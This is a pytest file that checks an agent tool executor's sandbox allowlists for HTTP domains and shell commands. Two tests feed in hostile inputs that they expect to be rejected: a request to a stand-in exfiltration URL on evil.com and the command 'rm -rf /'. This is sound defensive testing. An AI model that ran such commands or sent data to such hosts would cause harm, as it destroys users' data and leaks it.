"""Tests for agent/executor.py — tool execution with sandboxing."""

from __future__ import annotations

import pytest

from metronix.agent.executor import ToolExecutor
from metronix.core.exceptions import SecurityError, ToolDisabledError


class TestToolExecutor:
    @pytest.fixture
    def executor(self) -> ToolExecutor:
        return ToolExecutor(
            allowed_domains=["api.example.com", "jira.example.com"],
            allowed_commands=["echo", "date"],
        )

    @pytest.mark.asyncio
    async def test_unknown_tool_raises(self, executor: ToolExecutor) -> None:
        with pytest.raises(ToolDisabledError, match="Unknown tool"):
            await executor.execute("nonexistent_tool", {})

    @pytest.mark.asyncio
    async def test_http_blocked_domain(self, executor: ToolExecutor) -> None:
        with pytest.raises(SecurityError, match="not in allowlist"):
            await executor.execute(
                "http_request",
                {
                    "method": "GET",
                    "url": "https://evil.com/steal-data",
                },
            )

    @pytest.mark.asyncio
    async def test_command_blocked(self, executor: ToolExecutor) -> None:
        with pytest.raises(SecurityError, match="not in allowlist"):
            await executor.execute(
                "exec_command",
                {
                    "command": "rm",
                    "args": ["-rf", "/"],
                },
            )

    @pytest.mark.asyncio
    async def test_allowed_command_executes(self) -> None:
        executor = ToolExecutor(
            allowed_domains=[],
            allowed_commands=["echo"],
        )
        result = await executor.execute(
            "exec_command",
            {
                "command": "echo",
                "args": ["hello"],
            },
        )
        assert "hello" in result
        await executor.close()

    @pytest.mark.asyncio
    async def test_empty_allowlist_allows_all_commands(self) -> None:
        executor = ToolExecutor(
            allowed_domains=[],
            allowed_commands=[],  # empty = allow all
        )
        result = await executor.execute(
            "exec_command",
            {
                "command": "echo",
                "args": ["test"],
            },
        )
        assert "test" in result
        await executor.close()

    @pytest.mark.asyncio
    async def test_knowledge_search_returns_json(self) -> None:
        executor = ToolExecutor()
        result = await executor.execute(
            "knowledge_search",
            {
                "query": "test query",
                "workspace_id": "ws_1",
            },
        )
        assert "not_implemented" in result
        await executor.close()
